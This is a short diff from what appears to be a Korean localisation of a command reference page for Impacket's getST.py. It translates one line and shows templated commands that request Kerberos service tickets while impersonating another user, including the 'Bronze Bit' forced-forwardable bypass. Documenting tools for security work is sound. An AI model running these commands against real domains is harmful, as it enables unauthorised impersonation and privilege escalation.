@@ -20,6 +20,6 @@
 
 `getST.py -k -impersonate {{타겟_사용자}} {{도메인}}/{{사용자명}} -spn {{서비스}}/{{대상}}`
 
-- Force the ticket to be forwardable (Bronze Bit):
+- 티켓을 강제로 전달 가능 (Bronze Bit):
 
 `getST.py -force-forwardable -k {{도메인}}/{{사용자명}} -spn {{서비스}}/{{대상}}`
